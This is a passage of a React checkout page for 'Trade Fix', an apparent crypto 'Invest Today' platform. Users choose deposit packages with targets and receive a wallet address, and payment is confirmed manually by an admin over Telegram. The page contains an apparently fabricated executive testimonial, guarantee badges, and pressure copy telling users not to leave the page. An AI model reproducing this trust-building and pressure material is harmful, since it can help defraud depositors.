        .badgeItem { border:1px solid #f3f4f6; border-radius:10px; background:#f9fafb; padding:7px; text-align:center; color:#6b7280; font-size:11px; display:grid; gap:4px; place-items:center; }
        .okDot { width:16px; height:16px; border-radius:999px; background:#dcfce7; color:#15803d; display:grid; place-items:center; font-size:10px; font-weight:800; }
        .success { min-height:520px; display:grid; place-items:center; text-align:center; animation:fadeUp .42s ease; }
        .success h2 { margin:14px 0 0; color:#15803d; font-size:34px; letter-spacing:-0.02em; font-family:"DM Serif Display",serif; }
        .success p { margin:8px 0 0; color:#6b7280; font-size:14px; }
        .redirectLink { margin-top:10px; color:#15803d; font-size:13px; text-decoration:underline; }
        .invoiceQr { margin:14px auto 0; width:180px; height:180px; border:1px solid #dcfce7; border-radius:12px; background:#fff; padding:6px; object-fit:contain; }
        .invoiceBtn { margin-top:12px; display:inline-flex; align-items:center; gap:8px; border-radius:10px; background:#16a34a; color:#fff; padding:10px 14px; text-decoration:none; font-weight:700; }
        .invoiceBtn:hover { background:#15803d; }
        .invoiceActions { margin-top:10px; display:flex; justify-content:center; gap:8px; flex-wrap:wrap; }
        .invoiceCheckBtn { border:1px solid #16a34a; background:#fff; color:#15803d; border-radius:10px; padding:9px 12px; font-weight:700; cursor:pointer; }
        .invoiceCheckBtn:hover { background:#f0fdf4; }
        .checkoutProgressWrap { margin-top: 12px; }
        .checkoutProgressHead {
          display:flex;
          justify-content:space-between;
          align-items:center;
          font-size:12px;
          color:#4b5563;
          margin-bottom:6px;
          font-weight:700;
        }
        .checkoutProgressTrack {
          height:8px;
          border-radius:999px;
          background:#dcfce7;
          overflow:hidden;
          border:1px solid #bbf7d0;
        }
        .checkoutProgressFill {
          height:100%;
          width:0%;
          background:linear-gradient(90deg,#16a34a,#22c55e);
          transition:width .35s ease;
        }
        .checkoutProgressSteps {
          margin-top:8px;
          display:flex;
          gap:8px;
          flex-wrap:wrap;
          color:#6b7280;
          font-size:11px;
          font-weight:700;
        }
        .checkoutStepDot {
          width:8px;
          height:8px;
          border-radius:999px;
          background:#d1d5db;
          display:inline-block;
          margin-right:5px;
        }
        .checkoutStepOn .checkoutStepDot { background:#16a34a; }
        .insightGrid {
          margin-top: 12px;
          display:grid;
          grid-template-columns: repeat(3, minmax(0,1fr));
          gap:8px;
        }
        .insightPill {
          border:1px solid #dcfce7;
          background: linear-gradient(180deg, #f8fff9, #f0fdf4);
          border-radius:12px;
          padding:8px 10px;
          min-height:54px;
        }
        .insightLabel { font-size:10px; font-weight:800; letter-spacing:.08em; color:#6b7280; text-transform:uppercase; }
        .insightValue { margin-top:4px; font-size:13px; font-weight:800; color:#166534; }
        .quotePanel {
          border:1px solid #bbf7d0;
          background: linear-gradient(180deg, #f8fff9, #f0fdf4);
          border-radius:14px;
          padding:12px;
        }
        .quoteTop { display:flex; align-items:center; justify-content:space-between; gap:10px; }
        .quoteTitle { font-size:12px; font-weight:800; color:#166534; text-transform:uppercase; letter-spacing:.05em; }
        .quoteRows { margin-top:8px; display:grid; gap:6px; }
        .quoteRow { display:flex; align-items:center; justify-content:space-between; font-size:12px; }
        .quoteKey { color:#6b7280; font-weight:700; }
        .quoteVal { color:#111827; font-weight:800; }
        .miniBtn {
          border:1px solid #86efac;
          background:#fff;
          color:#15803d;
          border-radius:999px;
          padding:6px 10px;
          font-size:11px;
          font-weight:800;
          cursor:pointer;
        }
        .miniBtn:disabled { opacity:.55; cursor:not-allowed; }
        .checklist {
          border:1px dashed #bbf7d0;
          border-radius:12px;
          padding:10px 12px;
          background:#f8fff9;
          display:grid;
          gap:6px;
        }
        .checkItem {
          display:flex;
          align-items:center;
          gap:8px;
          font-size:12px;
          color:#374151;
        }
        .checkDot {
          width:16px;
          height:16px;
          border-radius:999px;
          border:1px solid #86efac;
          background:#dcfce7;
          color:#15803d;
          display:grid;
          place-items:center;
          font-size:10px;
          font-weight:800;
        }
        .progress { margin-top:20px; width:100%; height:4px; border-radius:999px; background:#dcfce7; overflow:hidden; }
        .progressBar { height:100%; width:0; background:#16a34a; animation:load3 3s linear forwards; }
        .successSvg { width:96px; height:96px; }
        .drawCircle { stroke-dasharray:180; stroke-dashoffset:180; animation:circle .7s ease forwards; }
        .drawCheck { stroke-dasharray:70; stroke-dashoffset:70; animation:check .45s .35s ease forwards; }
        .checkoutFooter { margin-top:18px; border-top:1px solid #dcfce7; padding:16px 24px; text-align:center; color:#9ca3af; font-size:12px; }
        @keyframes fadeUp { from { opacity:0; transform:translateY(10px);} to { opacity:1; transform:translateY(0);} }
        @keyframes shimmer { to { transform:translateX(120%);} }
        @keyframes spin { to { transform:rotate(360deg);} }
        @keyframes shake { 0%,100%{transform:translateX(0)} 30%{transform:translateX(-3px)} 70%{transform:translateX(3px)} }
        @keyframes circle { to { stroke-dashoffset:0; } }
        @keyframes check { to { stroke-dashoffset:0; } }
        @keyframes load3 { from { width:0; } to { width:100%; } }
        @keyframes homePulse {
          0%, 100% { box-shadow:0 10px 24px rgba(22,163,74,.36); }
          50% { box-shadow:0 12px 30px rgba(22,163,74,.52); }
        }
        @keyframes pulseStay {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.01); }
        }
      `}</style>

      <div className="checkoutTopBar" />
      <header className="checkoutNav">
        <div className="checkoutNavInner">
          <div className="checkoutLogo">
            <span className="checkoutLogoMark">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 3l7 4v5c0 5-3.5 8-7 9-3.5-1-7-4-7-9V7l7-4z" />
                <path d="M8.5 12.5l2.2 2.2 4.8-4.8" />
              </svg>
            </span>
            <span>Trade Fix</span>
          </div>
          <div style={{ fontSize: "13px", fontWeight: 700, color: "#374151" }}>Secure Checkout</div>
          <div className="checkoutNavActions">
            <a href="/dashboard" className="checkoutHomeBtn">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M3 10.5L12 3l9 7.5" />
                <path d="M5 9.5V20h14V9.5" />
              </svg>
              Back to Dashboard
            </a>
            <a href="/contact" style={{ fontSize: "13px", color: "#15803d" }}>Need Help?</a>
          </div>
        </div>
      </header>

      <a href="/dashboard" className="checkoutFloatingHome">
        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
          <path d="M3 10.5L12 3l9 7.5" />
          <path d="M5 9.5V20h14V9.5" />
        </svg>
        Dashboard
      </a>

      <main className="checkoutWrap">
        <div className="checkoutGrid">
          <section className="checkoutCard">
            <div className="summaryWatermark">VERIFIED</div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 16 }}>
              <span className="checkoutLogoMark" style={{ width: 34, height: 34 }}>
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 3l7 4v5c0 5-3.5 8-7 9-3.5-1-7-4-7-9V7l7-4z" />
                  <path d="M8.5 12.5l2.2 2.2 4.8-4.8" />
                </svg>
              </span>
              <h2 className="serif h2">Order Summary</h2>
            </div>

            {ITEMS.map((it) => (
              <div className="lineItem" key={it.id}>
                <div className="lineLeft">
                  <span className="lineIcon">{it.icon}</span>
                  <div>
                    <div className="lineName">{it.pool} · {it.name}</div>
                    <div className="lineDesc">{it.desc}</div>
                  </div>
                </div>
                <div className="linePrice">{it.deposit}</div>
              </div>
            ))}

            <div className="totals">
              <div className="totalsRow"><span>Selected Network</span><span>{selectedNetwork.label}</span></div>
              <div className="totalsRow"><span>Base Amount</span><span>{baseAmount ? `${baseAmount} ${baseAsset}` : "--"}</span></div>
              <div className="totalsRow"><span>Selected Package</span><span>{selectedPackage?.pool} - {selectedPackage?.name}</span></div>
              <div className="totalsRow"><span>Deposit Amount</span><span>{btcAmount || "--"} {selectedNetwork.asset}</span></div>
              <div className="totalsRow totalRow">
                <span style={{ fontWeight: 700, color: "#111827" }}>Checkout Mode</span>
                <span className="totalVal" style={{ fontSize: 22 }}>Manual</span>
              </div>
            </div>

            <div className="trust">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 3l7 4v5c0 5-3.5 8-7 9-3.5-1-7-4-7-9V7l7-4z" />
                <path d="M8.5 12.5l2.2 2.2 4.8-4.8" />
              </svg>
              256-bit SSL Encrypted - Secure Checkout
            </div>

            <div className="testimonial">
              <div className="quote">"Fast, clear, and trusted. This checkout is built for confidence."</div>
              <div className="person">
                <div className="avatar" />
                <div>
                  <div style={{ fontWeight: 700, fontSize: 13 }}>Olivia Brooks</div>
                  <div style={{ color: "#6b7280", fontSize: 12 }}>VP Finance, Northstar Ops</div>
                </div>
              </div>
            </div>
          </section>

          <section className="checkoutCard delay">
            {!invoiceReady ? (
              <>
                <h1 className="serif h2">Invest Today</h1>
                <p className="subtle" style={{ fontStyle: "italic", marginTop: 4 }}>Blockchain-first, secure, and operator-verified settlement.</p>
                <div style={{ marginTop: 8, display: "inline-flex", alignItems: "center", gap: 8, border: "1px solid #bbf7d0", background: "#f0fdf4", color: "#166534", borderRadius: 999, padding: "6px 10px", fontSize: 12, fontWeight: 700 }}>
                  <span style={{ width: 8, height: 8, borderRadius: 999, background: "#16a34a" }} />
                  Professional Invest Mode
                </div>
                <div className="checkoutProgressWrap" aria-label="Checkout progress">
                  <div className="checkoutProgressHead">
                    <span>{checkoutProgress.label}</span>
                    <span>{checkoutProgress.pct}%</span>
                  </div>
                  <div className="checkoutProgressTrack">
                    <div className="checkoutProgressFill" style={{ width: `${checkoutProgress.pct}%` }} />
                  </div>
                  <div className="checkoutProgressSteps">
                    <span className={checkoutProgress.pct >= 40 ? "checkoutStepOn" : ""}><span className="checkoutStepDot" />Details</span>
                    <span className={checkoutProgress.pct >= 72 ? "checkoutStepOn" : ""}><span className="checkoutStepDot" />Invoice</span>
                    <span className={checkoutProgress.pct >= 100 ? "checkoutStepOn" : ""}><span className="checkoutStepDot" />Confirmed</span>
                  </div>
                </div>
                <div className="insightGrid">
                  <div className="insightPill">
                    <div className="insightLabel">Quote Status</div>
                    <div className="insightValue">{isQuoteReady ? "Locked and Ready" : "Waiting for Quote"}</div>
                  </div>
                  <div className="insightPill">
                    <div className="insightLabel">Payment Rail</div>
                    <div className="insightValue">{selectedNetwork.chain}</div>
                  </div>
                  <div className="insightPill">
                    <div className="insightLabel">Reference</div>
                    <div className="insightValue">{checkoutReference}</div>
                  </div>
                </div>

                <form onSubmit={onPay} className="formGrid" style={{ marginTop: 16 }}>
                  <div>
                    <h3 className="sectionTitle">Contact Information</h3>
                    <div className="formGrid">
                      <div className={`fieldWrap ${errors.fullName ? "err" : ""}`}>
                        <input aria-label="Full Name" type="text" className="field" placeholder=" " value={fullName} onChange={(e) => setFullName(e.target.value)} onInput={(e) => setFullName(e.currentTarget.value)} />
                        <label className="fieldLabel">Full Name</label>
                        {errors.fullName ? <div className="fieldError">{errors.fullName}</div> : null}
                      </div>
                    </div>
                  </div>

                  <div>
                    <h3 className="sectionTitle">Location</h3>
                    <div className="formGrid">
                      <div>
                        <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>Country</label>
                        <select className="field" value={country} onChange={(e) => setCountry(e.target.value)}>
                          <option>United States</option>
                          <option>United Kingdom</option>
                          <option>Canada</option>
                          <option>Germany</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h3 className="sectionTitle">Payment Details</h3>
                    <div className="formGrid">
                      <div>
                        <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>Package Plan</label>
                        <div className="networkDesigner">
                          <div className="networkDesignerHead">
                            <div className="networkGlyph">{(selectedPackage?.icon || "P").slice(0, 2)}</div>
                            <div>
                              <div className="networkHeadTitle">{selectedPackage?.pool} - {selectedPackage?.name}</div>
                              <div className="networkHeadSub">{selectedPackage?.desc}</div>
                            </div>
                          </div>
                          <div className="networkSelectWrap">
                            <select className="networkSelect" value={packageId} onChange={(e) => setPackageId(e.target.value)}>
                              {ITEMS.map((it) => (
                                <option key={it.id} value={it.id}>
                                  {it.pool} - {it.name} ({it.deposit})
                                </option>
                              ))}
                            </select>
                            <span className="networkSelectIcon" aria-hidden="true">
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M7 10l5 5 5-5" />
                              </svg>
                            </span>
                          </div>
                          <div className="networkMetaRow">
                            <span className="networkChip">Deposit: {selectedPackage?.deposit}</span>
                            <span className="networkChip">Target: {selectedPackage?.target}</span>
                          </div>
                        </div>
                        {errors.packageId ? <div className="fieldError">{errors.packageId}</div> : null}
                      </div>
                      <div>
                        <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>Blockchain Network</label>
                        <div className="networkDesigner">
                          <div className="networkDesignerHead">
                            <div className="networkGlyph">{selectedNetwork.label.slice(0, 2)}</div>
                            <div>
                              <div className="networkHeadTitle">{selectedNetwork.label} Network Selected</div>
                              <div className="networkHeadSub">Choose your settlement rail before creating invoice.</div>
                            </div>
                          </div>
                          <div className="networkSelectWrap">
                            <select className="networkSelect" value={networkId} onChange={(e) => setNetworkId(e.target.value)}>
                              {NETWORK_OPTIONS.map((it) => (
                                <option key={it.id} value={it.id}>
                                  {it.label}
                                </option>
                              ))}
                            </select>
                            <span className="networkSelectIcon" aria-hidden="true">
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M7 10l5 5 5-5" />
                              </svg>
                            </span>
                          </div>
                          <div className="networkMetaRow">
                            <span className="networkChip">Asset: {selectedNetwork.asset}</span>
                            <span className="networkChip">Chain: {selectedNetwork.chain}</span>
                            <span className="networkChip">{quoteLoading ? "Fetching server quote..." : "Server-side quote"}</span>
                            {quoteSource ? <span className="networkChip">{quoteSource}</span> : null}
                          </div>
                          {quoteHint ? <div className="subtle" style={{ marginTop: 8 }}>{quoteHint}</div> : null}
                          {quoteError ? <div className="fieldError" style={{ marginTop: 8 }}>{quoteError}</div> : null}
                        </div>
                        {errors.networkId ? <div className="fieldError">{errors.networkId}</div> : null}
                      </div>
                      <div className={`fieldWrap ${errors.btcAmount ? "err" : ""}`}>
                        <input aria-label="Deposit Amount" type="text" className="field" placeholder=" " value={btcAmount} readOnly aria-readonly="true" />
                        <label className="fieldLabel">Deposit Amount ({selectedNetwork.asset})</label>
                        {errors.btcAmount ? <div className="fieldError">{errors.btcAmount}</div> : null}
                      </div>
                      <div className="btcRail">Rail locked: {selectedNetwork.chain} (invoice priced in {selectedNetwork.asset})</div>
                      <div className="quotePanel">
                        <div className="quoteTop">
                          <div className="quoteTitle">Conversion Quote</div>
                          <button type="button" className="miniBtn" onClick={() => void refreshQuote()} disabled={quoteLoading}>
                            {quoteLoading ? "Refreshing..." : "Refresh Quote"}
                          </button>
                        </div>
                        <div className="quoteRows">
                          <div className="quoteRow"><span className="quoteKey">From package</span><span className="quoteVal">{baseAmount} {baseAsset}</span></div>
                          <div className="quoteRow"><span className="quoteKey">To pay</span><span className="quoteVal">{btcAmount || "--"} {selectedNetwork.asset}</span></div>
                          <div className="quoteRow"><span className="quoteKey">Checkout reference</span><span className="quoteVal">{checkoutReference}</span></div>
                        </div>
                        <div style={{ marginTop: 8, display: "flex", gap: 8, flexWrap: "wrap" }}>
                          <button type="button" className="miniBtn" onClick={copyReference}>{referenceCopied ? "Copied" : "Copy Ref"}</button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="checklist">
                    <div className="checkItem"><span className="checkDot">1</span><span>{fullName.trim() ? "Name captured" : "Add your full name"}</span></div>
                    <div className="checkItem"><span className="checkDot">2</span><span>{networkId ? `Network set: ${selectedNetwork.label}` : "Select blockchain network"}</span></div>
                    <div className="checkItem"><span className="checkDot">3</span><span>{isQuoteReady ? "Server quote locked" : "Waiting for live server quote"}</span></div>
                  </div>

                  <button type="submit" className="payBtn" disabled={loading || quoteLoading || !quoteSource || quoteSource === "compat"}>
                    <span className="payInner">
                      {!loading ? (
                        <>
                          <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" strokeWidth="2">
                            <rect x="4" y="11" width="16" height="10" rx="2" />
                            <path d="M8 11V8a4 4 0 118 0v3" />
                          </svg>
                          Invest ({selectedNetwork.label})
                        </>
                      ) : (
                        <span className="spinner" />
                      )}
                    </span>
                  </button>
                  {invoiceMsg ? <div className="invoiceMsg">{invoiceMsg}</div> : null}

                  <div className="badges">
                    <div className="badgeItem"><span className="okDot">OK</span><span>Money-Back Guarantee</span></div>
                    <div className="badgeItem"><span className="okDot">OK</span><span>No Hidden Fees</span></div>
                    <div className="badgeItem"><span className="okDot">OK</span><span>Cancel Anytime</span></div>
                  </div>
                </form>
              </>
            ) : confirmed ? (
              <div className="success">
                <div>
                  <svg className="successSvg" viewBox="0 0 96 96">
                    <circle cx="48" cy="48" r="34" className="drawCircle" fill="none" stroke="#16a34a" strokeWidth="4" />
                    <path d="M32 49l11 11 21-21" className="drawCheck" fill="none" stroke="#16a34a" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <h2>Payment Confirmed</h2>
                  <p>Your BTC payment is confirmed. Redirecting to your dashboard...</p>
                  <a className="redirectLink" href="/dashboard">Click here if you're not redirected</a>
                  <div className="progress"><div className="progressBar" /></div>
                </div>
              </div>
            ) : (
              <div className="success">
                <div>
                  <svg className="successSvg" viewBox="0 0 96 96">
                    <circle cx="48" cy="48" r="34" className="drawCircle" fill="none" stroke="#16a34a" strokeWidth="4" />
                    <path d="M32 49l11 11 21-21" className="drawCheck" fill="none" stroke="#16a34a" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <h2>Invest Session Ready</h2>
                  <p>Send exactly the amount below to the selected wallet address, then check your deposit status.</p>
                  <div className="walletCard">
                    <div className="walletHead">
                      <span>Wallet Address ({selectedNetwork.label})</span>
                      <button type="button" className="miniBtn" onClick={copyWalletAddress}>{walletCopied ? "Copied" : "Copy Address"}</button>
                    </div>
                    <div className="walletAddress">{selectedWalletAddress}</div>
                    <div className="walletMeta">
                      Amount: <strong>{btcAmount || "--"} {selectedNetwork.asset}</strong> | Reference: <strong>{checkoutReference}</strong>
                    </div>
                  </div>
                  <div className={`invoiceStatus ${paymentStatus === "failed" || paymentStatus === "expired" ? "isBad" : ""}`}>
                    Status: {statusLabel}
                  </div>
                  <div className="waitTrack"><div className="waitFill" style={{ width: `${waitProgressPct}%` }} /></div>
                  <div className="waitMeta">Waiting for deposit confirmation: {Math.floor(waitElapsedSec / 60)}m {waitElapsedSec % 60}s</div>
                  {isLongWait ? (
                    <div className="adminNotice">
                      This is taking longer than expected. If you already sent funds, contact admin for fast manual review.
                    </div>
                  ) : null}
                  <div className="stayNotice">
                    IMPORTANT: Do not leave or close this page while your payment is waiting for admin approval.
                  </div>
                  <div className="invoiceActions">
                    <button type="button" className="invoiceCheckBtn" onClick={() => void checkPaymentStatus()} disabled={checkingStatus}>
                      {checkingStatus ? "Checking..." : "I've Paid - Check Status"}
                    </button>
                    <a className="invoiceBtn" href={ADMIN_TELEGRAM_URL} target="_blank" rel="noreferrer">
                      Contact Admin (Telegram)
                    </a>
                  </div>
                  <a className="redirectLink" href="/dashboard">Back to dashboard</a>
                </div>
              </div>
            )}
          </section>
        </div>
      </main>

      <footer className="checkoutFooter">(c) 2026 Trade Fix | Privacy Policy | Terms of Service</footer>
    </div>
  );
}

